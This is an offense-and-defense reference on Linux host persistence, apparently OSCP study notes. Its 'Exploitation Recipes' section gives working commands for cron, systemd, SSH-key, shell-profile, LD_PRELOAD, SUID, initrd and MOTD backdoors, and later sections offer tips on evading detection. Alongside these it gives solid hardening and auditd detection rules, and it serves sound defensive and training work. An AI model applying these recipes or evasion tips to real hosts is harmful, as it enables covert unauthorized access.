## 1. Overview

Linux host persistence is the set of techniques that let an attacker
retain access to a compromised host across reboots, logoffs, and
partial remediation. Defense is the symmetric phase: detecting and
removing persistence, and hardening the host against it.

**Why host persistence matters:**

- A single host with persistence is a permanent foothold.
- Many persistence techniques survive password rotations.
- Detection is often retrospective.
- Remediation requires knowing exactly what was changed.

**Technique families:**

| Family | Examples | Survives reboot | Noise |
|--------|----------|-----------------|-------|
| Cron | User and system cron jobs | Yes | Low |
| systemd | Services, timers, sockets | Yes | Low |
| SSH | authorized_keys, agent | Yes | Low |
| Shell profiles | .bashrc, .profile | Yes (on login) | Low |
| PAM | Modified PAM modules | Yes | Medium |
| LD_PRELOAD | /etc/ld.so.preload | Yes | Medium |
| Kernel modules | Custom .ko | Yes | High |
| SUID backdoor | SUID shell copy | Yes | Medium |
| Systemd generator | Early boot execution | Yes | Medium |
| Initrd | Modified initramfs | Yes | High |
| Bootloader | GRUB config | Yes | High |
| MOTD / profile.d | Scripts run at login | Yes | Low |

## 2. Reconnaissance / Enumeration

**Offensive - cron:**

    # System cron
    cat /etc/crontab
    ls -la /etc/cron.d/
    ls -la /etc/cron.hourly/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.weekly/
    ls -la /etc/cron.monthly/
    cat /etc/cron.d/* 2>/dev/null

    # User cron
    crontab -l
    for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null; done
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
    cat /var/spool/cron/crontabs/* 2>/dev/null

    # Monitor in real time
    ./pspy64

**Offensive - systemd:**

    # All services and timers
    systemctl list-units --type=service
    systemctl list-timers --all

    # Unit files
    ls -la /etc/systemd/system/
    ls -la /lib/systemd/system/
    ls -la /usr/lib/systemd/system/
    ls -la /run/systemd/system/

    # Recently modified units
    find /etc/systemd/system/ /lib/systemd/system/ -mtime -7 -type f 2>/dev/null

    # Generator directories (early boot execution)
    ls -la /etc/systemd/system-generators/ 2>/dev/null
    ls -la /lib/systemd/system-generators/ 2>/dev/null

**Offensive - SSH:**

    # authorized_keys of all users
    for u in $(cut -d: -f1 /etc/passwd); do
      home=$(getent passwd $u | cut -d: -f6)
      [ -f "$home/.ssh/authorized_keys" ] && echo "=== $u ===" && cat "$home/.ssh/authorized_keys"
    done

    # Root's authorized_keys
    cat /root/.ssh/authorized_keys 2>/dev/null

    # sshd_config modifications
    diff /etc/ssh/sshd_config /etc/ssh/sshd_config.bak 2>/dev/null
    grep -iE "PermitRootLogin|AuthorizedKeysFile|ForceCommand" /etc/ssh/sshd_config

**Offensive - shell profiles:**

    # User profiles
    cat ~/.bashrc
    cat ~/.bash_profile
    cat ~/.profile
    cat ~/.zshrc

    # System-wide profiles
    cat /etc/profile
    ls -la /etc/profile.d/
    cat /etc/profile.d/*.sh 2>/dev/null
    cat /etc/bash.bashrc

    # Skeleton (applies to new users)
    cat /etc/skel/.bashrc
    cat /etc/skel/.profile

**Offensive - PAM:**

    # PAM modules and configuration
    cat /etc/pam.d/*
    ls -la /lib/security/ /lib/x86_64-linux-gnu/security/ 2>/dev/null

    # Recently modified PAM modules
    find /lib/security/ /lib/x86_64-linux-gnu/security/ -mtime -7 2>/dev/null

**Offensive - LD_PRELOAD:**

    # Global preload
    cat /etc/ld.so.preload

    # Per-user preload (via environment)
    grep -r "LD_PRELOAD" /etc/ /home/ 2>/dev/null

**Offensive - kernel modules:**

    # Loaded modules
    lsmod

    # All available modules
    find /lib/modules/ -name "*.ko" 2>/dev/null

    # Recently loaded modules (check dmesg)
    dmesg | grep -i "module"

**Offensive - SUID backdoors:**

    # All SUID binaries (compare against baseline)
    find / -perm -4000 -type f 2>/dev/null

    # Look for unusual names (e.g. /tmp/rootbash)
    ls -la /tmp/ /var/tmp/ /dev/shm/

**Offensive - initrd and bootloader:**

    # Initrd
    ls -la /boot/
    lsinitramfs /boot/initrd.img-* 2>/dev/null

    # GRUB config
    cat /boot/grub/grub.cfg 2>/dev/null
    ls -la /etc/grub.d/

**Offensive - MOTD and profile.d:**

    # Login banners
    cat /etc/motd
    cat /etc/issue
    ls -la /etc/update-motd.d/
    cat /etc/update-motd.d/* 2>/dev/null

**Offensive - automated:**

    # LinPEAS persistence section
    ./linpeas.sh

    # chkrootkit / rkhunter
    chkrootkit
    rkhunter --check

    # AIDE / Tripwire (if installed)
    aide --check

**Defensive - hunt persistence:**

    # Recently modified files (last 7 days)
    find / -mtime -7 -type f 2>/dev/null | grep -vE "/proc|/sys|/dev|/run|/var/log|/var/cache" | head -50

    # Recently modified cron files
    find /etc/cron* /var/spool/cron -mtime -7 2>/dev/null

    # Recently modified systemd units
    find /etc/systemd/system/ /lib/systemd/system/ -mtime -7 2>/dev/null

    # Recently modified authorized_keys
    find /home /root -name "authorized_keys" -mtime -7 2>/dev/null

    # SUID files (compare against baseline)
    find / -perm -4000 -type f 2>/dev/null > /tmp/suid_now
    diff /var/lib/baseline/suid /tmp/suid_now

    # LD_PRELOAD check
    cat /etc/ld.so.preload 2>/dev/null

**Defensive - audit logs to check:**

- auditd events for file modifications in persistence paths.
- `auth.log` / `secure` for SSH key additions and logins.
- Cron execution logs (`/var/log/cron`, `/var/log/syslog`).
- systemd journal for unit start events.
- AIDE / Tripwire reports for file integrity changes.

## 3. Common Attack Vectors

**Cron persistence:**

- Add a cron job (user-level or system-level).
- User-level cron does not require root.
- System-level cron runs as root and survives reboot.

**systemd persistence:**

- Create a new service unit.
- Create a new timer unit.
- Modify an existing unit.
- Use systemd generators for early boot execution.

**SSH persistence:**

- Add a public key to `authorized_keys`.
- Modify `sshd_config` to enable root login or authorized keys from
  an unusual path.
- Backdoor `sshd` itself (rare, high effort).

**Shell profile persistence:**

- Add a line to `.bashrc`, `.profile`, `.zshrc`.
- Runs on every interactive shell.
- System-wide via `/etc/profile.d/`.

**PAM persistence:**

- Backdoor a PAM module (e.g. `pam_unix.so`) to accept a master
  password.
- Requires root and is high-risk for detection.

**LD_PRELOAD persistence:**

- Add a library path to `/etc/ld.so.preload`.
- Loaded into every dynamically-linked process.
- Requires root.

**Kernel module persistence:**

- Load a custom kernel module.
- Requires root and kernel headers.
- Very high effort, very stealthy.

**SUID backdoor:**

- Copy `bash` to a hidden location and set SUID.
- Any user can execute it for root.
- Easy to detect (SUID scan).

**Initrd persistence:**

- Modify the initramfs to include a payload.
- Runs before the OS is fully booted.
- Very high effort, very stealthy.

**Bootloader persistence:**

- Modify GRUB config to add a kernel parameter.
- Runs early in boot.
- Requires root, high effort.

**MOTD persistence:**

- Add a script to `/etc/update-motd.d/`.
- Runs on every SSH login.
- Often runs as root.

## 4. Exploitation Recipes

**Cron persistence (user-level):**

    # Add a cron job
    (crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh") | crontab -

    # Verify
    crontab -l

    # payload.sh runs every minute.

**Cron persistence (system-level):**

    # Requires root
    echo "* * * * * root /tmp/payload.sh" >> /etc/crontab

    # Or write a file in /etc/cron.d/
    cat > /etc/cron.d/updater <<'EOF'
    * * * * * root /tmp/payload.sh
    EOF

    # Verify
    cat /etc/cron.d/updater

**systemd service persistence (requires root):**

    # 1. Create the unit file
    cat > /etc/systemd/system/updater.service <<'EOF'
    [Unit]
    Description=Updater Service

    [Service]
    Type=simple
    ExecStart=/tmp/payload.sh
    Restart=always
    RestartSec=60

    [Install]
    WantedBy=multi-user.target
    EOF

    # 2. Enable and start
    systemctl daemon-reload
    systemctl enable updater.service
    systemctl start updater.service

    # 3. Verify
    systemctl status updater.service

**systemd timer persistence (requires root):**

    # 1. Service unit
    cat > /etc/systemd/system/updater.service <<'EOF'
    [Unit]
    Description=Updater Service

    [Service]
    Type=oneshot
    ExecStart=/tmp/payload.sh
    EOF

    # 2. Timer unit
    cat > /etc/systemd/system/updater.timer <<'EOF'
    [Unit]
    Description=Updater Timer

    [Timer]
    OnCalendar=*:0/5
    Persistent=true

    [Install]
    WantedBy=timers.target
    EOF

    # 3. Enable and start
    systemctl daemon-reload
    systemctl enable updater.timer
    systemctl start updater.timer

    # 4. Verify
    systemctl list-timers --all | grep updater

**systemd generator persistence (early boot, requires root):**

    # Generators run early in boot, before normal units.
    cat > /etc/systemd/system-generators/updater <<'EOF'
    #!/bin/bash
    mkdir -p /run/systemd/system/updater.service.d
    cat > /run/systemd/system/updater.service <<'UNIT'
    [Unit]
    Description=Updater

    [Service]
    ExecStart=/tmp/payload.sh
    Type=oneshot
    RemainAfterExit=yes

    [Install]
    WantedBy=multi-user.target
    UNIT
    EOF
    chmod +x /etc/systemd/system-generators/updater

    # Runs at every boot.

**SSH authorized_keys persistence:**

    # 1. Generate a key pair (on attacker)
    ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""

    # 2. Add the public key to authorized_keys (on target)
    mkdir -p ~/.ssh
    echo "<ATTACKER_PUBKEY>" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    chmod 700 ~/.ssh

    # 3. Connect with the private key
    ssh -i /tmp/backdoor_key user@target

**Shell profile persistence (user-level):**

    # Add a line to .bashrc
    echo '/tmp/payload.sh &' >> ~/.bashrc

    # Runs on every interactive bash shell.

**Shell profile persistence (system-wide, requires root):**

    # Add a script to /etc/profile.d/
    cat > /etc/profile.d/updater.sh <<'EOF'
    #!/bin/bash
    /tmp/payload.sh &
    EOF
    chmod +x /etc/profile.d/updater.sh

    # Runs on every login shell.

**PAM backdoor (requires root, high risk):**

    # 1. Back up the original PAM module
    cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak

    # 2. Patch the module to accept a master password (complex)
    # (See "PAM backdoor" references for details.)

    # 3. Log in with the master password
    su - root
    # Enter the master password.

**LD_PRELOAD persistence (requires root):**

    # 1. Compile a shared library
    cat > /tmp/evil.c <<'EOF'
    #include <stdio.h>
    #include <unistd.h>
    __attribute__((constructor)) void init() {
        if (geteuid() == 0) {
            system("/tmp/payload.sh &");
        }
    }
    EOF
    gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

    # 2. Add to ld.so.preload
    echo "/tmp/evil.so" >> /etc/ld.so.preload

    # 3. Every dynamically-linked process loads the library.

**SUID backdoor (requires root):**

    # 1. Copy bash to a hidden location
    cp /bin/bash /usr/lib/.hidden_bash
    chmod u+s /usr/lib/.hidden_bash

    # 2. Any user can execute it for root
    /usr/lib/.hidden_bash -p

**Initrd persistence (requires root, high effort):**

    # 1. Extract the initramfs
    mkdir /tmp/initrd && cd /tmp/initrd
    zcat /boot/initrd.img-$(uname -r) | cpio -idmv

    # 2. Add a payload to init
    echo "/tmp/payload.sh" >> init

    # 3. Repack
    find . | cpio -o -H newc | gzip > /boot/initrd.img-$(uname -r)

    # Payload runs at every boot, before the OS is fully loaded.

**MOTD persistence (requires root):**

    # Add a script to /etc/update-motd.d/
    cat > /etc/update-motd.d/99-updater <<'EOF'
    #!/bin/bash
    /tmp/payload.sh &
    EOF
    chmod +x /etc/update-motd.d/99-updater

    # Runs on every SSH login (Ubuntu/Debian).

## 5. Post-Exploitation

**After establishing persistence:**

- Verify persistence works: reboot the host (in a lab) or wait for the
  trigger.
- Document the technique used (for cleanup reference).
- Avoid stacking multiple persistence mechanisms on the same host.
- Prefer user-level persistence (cron, shell profile, authorized_keys) -
  requires no root and is often overlooked.

**Cleanup after use (blue team):**

- Enumerate all autoruns (cron, systemd, SSH, profiles, LD_PRELOAD,
  kernel modules, SUID binaries).
- Compare against a baseline of known-good autoruns.
- Remove unexpected entries.
- Check audit logs for the original modification.
- Reboot and verify persistence does not return.

**Detection evasion:**

- Use legitimate-looking names and paths.
- Avoid binary payloads; use script-based persistence.
- Blend in with legitimate cron/systemd entries.
- Use less common persistence mechanisms (systemd generators, initrd).

## 6. Risk Context

Linux host persistence is what turns a single compromise into a lasting
foothold:

- A single cron job or systemd service can survive for years.
- SSH authorized_keys persistence is silent and bypasses MFA.
- LD_PRELOAD and PAM backdoors are extremely stealthy.
- Kernel modules and initrd persistence survive OS reinstalls.

**Blast radius:** a persistent host can be re-compromised at any time,
even after remediation of the original vector.

**Why attacks succeed:**

- Autoruns are numerous and rarely reviewed.
- Cron and systemd are legitimate; their modifications are rarely
  alerted.
- SSH authorized_keys are common in legitimate operations.
- LD_PRELOAD and PAM are obscure; defenders rarely look.
- No baseline of autoruns.

## 7. Root Causes

- **Legitimate features abused.** Cron, systemd, SSH, PAM - all
  designed for legitimate use.
- **No baseline.** Autoruns are set once and never reviewed.
- **Weak monitoring.** Cron and systemd events are rarely alerted.
- **Root access not restricted.** Root allows any persistence.
- **No periodic review.** Autoruns drift over time.

## 8. Preventive Controls

**Cron hardening:**

- Restrict cron access to administrators (`/etc/cron.allow`).
- Audit cron entries quarterly.
- Use systemd timers instead of cron (better logging).

**systemd hardening:**

- Restrict write access to `/etc/systemd/system/` to administrators.
- Audit unit files quarterly.
- Use `systemd-analyze verify` to check units.

**SSH hardening:**

- Restrict `authorized_keys` writes to owners.
- Use `AuthorizedKeysCommand` for centralized management.
- Audit `authorized_keys` quarterly.
- Disable SSH agent forwarding by default.

**Shell profile hardening:**

- Restrict write access to `/etc/profile.d/`.
- Audit shell profiles quarterly.

**PAM hardening:**

- Restrict write access to PAM modules.
- Use file integrity monitoring (AIDE, Tripwire) on PAM modules.

**LD_PRELOAD hardening:**

- Restrict write access to `/etc/ld.so.preload`.
- Alert on any modification.

**Kernel module hardening:**

- Restrict module loading to signed modules (`module.sig_enforce=1`).
- Audit loaded modules.

**General:**

- Enable auditd.
- Enable AIDE / Tripwire for file integrity.
- Forward logs to a SIEM.
- Baseline autoruns; alert on changes.
- Use SELinux / AppArmor to confine processes.

## 9. Detection Controls

**Cron persistence:**

- auditd: `-w /etc/cron* -p wa -k cron`
- auditd: `-w /var/spool/cron -p wa -k cron`
- Alert on new cron entries.

**systemd persistence:**

- auditd: `-w /etc/systemd/system/ -p wa -k systemd`
- auditd: `-w /lib/systemd/system/ -p wa -k systemd`
- Alert on new unit files or modifications.
- Alert on `systemctl daemon-reload` from unusual users.

**systemd generator persistence:**

- auditd: `-w /etc/systemd/system-generators/ -p wa -k systemd_gen`
- Alert on new generator scripts.

**SSH persistence:**

- auditd: `-w /home -p wa -k home_mod` (watch for `.ssh/`)
- auditd: `-w /root/.ssh -p wa -k root_ssh`
- Alert on `authorized_keys` modifications.
- `auth.log` / `secure`: alert on new key-based logins.

**Shell profile persistence:**

- auditd: `-w /etc/profile.d/ -p wa -k profile`
- auditd: `-w /etc/profile -p wa -k profile`
- Alert on modifications to shell profiles.

**PAM persistence:**

- auditd: `-w /etc/pam.d/ -p wa -k pam`
- auditd: `-w /lib/security -p wa -k pam`
- AIDE / Tripwire on PAM modules.

**LD_PRELOAD persistence:**

- auditd: `-w /etc/ld.so.preload -p wa -k ld_preload`
- Alert on any modification.

**Kernel module persistence:**

- auditd: `-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load`
- Alert on unexpected module loads.

**SUID backdoor:**

- Baseline SUID binaries; alert on new ones.
- AIDE / Tripwire.

**Initrd / bootloader persistence:**

- AIDE / Tripwire on `/boot/`.
- Alert on initrd or GRUB modifications.

**MOTD persistence:**

- auditd: `-w /etc/update-motd.d/ -p wa -k motd`
- Alert on new MOTD scripts.

**General:**

- AIDE / Tripwire for file integrity.
- OSSEC / Wazuh for HIDS.
- Falco for runtime security.
- Sysmon for Linux (process creation, file create).

## 10. Verification

**Offensive - is persistence in place?**

- Cron: the entry exists and the payload runs on schedule.
- systemd: the unit exists and the service/timer is enabled.
- SSH: the public key is in `authorized_keys` and login works.
- Shell profile: the line exists and the payload runs on login.
- LD_PRELOAD: the library exists and is loaded by processes.
- SUID backdoor: the binary exists and runs as root.

**Defensive - are controls effective?**

- Test cron persistence: new entry generates audit event; alert fires.
- Test systemd persistence: new unit generates audit event; alert
  fires.
- Test SSH persistence: `authorized_keys` modification generates audit
  event; alert fires.
- Test shell profile persistence: modification generates audit event.
- Test LD_PRELOAD: modification generates audit event.
- Verify baseline: autoruns review shows no unexpected entries.

## 11. OSCP Notes

- Persistence is rarely required in OSCP (time-boxed), but appears in
  OSCP-like labs.
- Common techniques to practice: cron, SSH authorized_keys, shell
  profile.
- **Capture screenshots** of:
  - The persistence mechanism created (cron entry, authorized_keys).
  - The persistence verification (login or trigger).
  - The successful re-access.
- The `> [!IMPORTANT]` OSCP reporting note applies to the persistence
  verification step.

## 12. Production Notes

- Modern HIDS detects most persistence techniques within seconds:
  - Cron modifications - auditd + HIDS alert.
  - systemd modifications - auditd + HIDS alert.
  - `authorized_keys` modifications - auditd + HIDS alert.
  - LD_PRELOAD modifications - auditd + HIDS alert.
- In mature environments, use less common persistence mechanisms
  (systemd generators, initrd, kernel modules) or avoid persistence
  entirely.
- Prefer user-level persistence (cron, shell profile, authorized_keys) -
  requires no root and is often overlooked.
- Assume HIDS is present; plan for one-shot access rather than long-term
  persistence.
- Cleanup after red team: remove all persistence before disengaging.

## 13. References

**Linux documentation:**

- [cron manual](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [systemd.service](https://www.freedesktop.org/software/systemd/man/systemd.service.html)
- [systemd.timer](https://www.freedesktop.org/software/systemd/man/systemd.timer.html)
- [PAM documentation](http://www.linux-pam.org/Linux-PAM-html/)
- [ld.so manual](https://man7.org/linux/man-pages/man8/ld.so.8.html)

**MITRE ATT&CK:**

- [Persistence - Scheduled Task/Job: Cron (T1053.003)](https://attack.mitre.org/techniques/T1053/003/)
- [Persistence - Create or Modify System Process: Systemd Service (T1543.002)](https://attack.mitre.org/techniques/T1543/002/)
- [Persistence - Account Manipulation: SSH Authorized Keys (T1098.004)](https://attack.mitre.org/techniques/T1098/004/)
- [Persistence - Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)](https://attack.mitre.org/techniques/T1546/004/)
- [Persistence - Hijack Execution Flow: Dynamic Linker Hijacking (T1574.006)](https://attack.mitre.org/techniques/T1574/006/)
- [Persistence - Create or Modify System Process: Kernel Modules and Extensions (T1547.006)](https://attack.mitre.org/techniques/T1547/006/)

**Tools:**

- [AIDE](https://aide.github.io/)
- [Tripwire](https://github.com/Tripwire/tripwire-open-source)
- [chkrootkit](http://www.chkrootkit.org/)
- [rkhunter](http://rkhunter.sourceforge.net/)
- [Falco](https://falco.org/)
- [Wazuh](https://wazuh.com/)
- [Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux)

**Research:**

- [HackTricks - Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [SANS - Linux Persistence](https://www.sans.org/blog/linux-persistence-techniques/)
- [Persistence Mechanisms on Linux](https://github.com/Karneades/awesome-linux-persistence)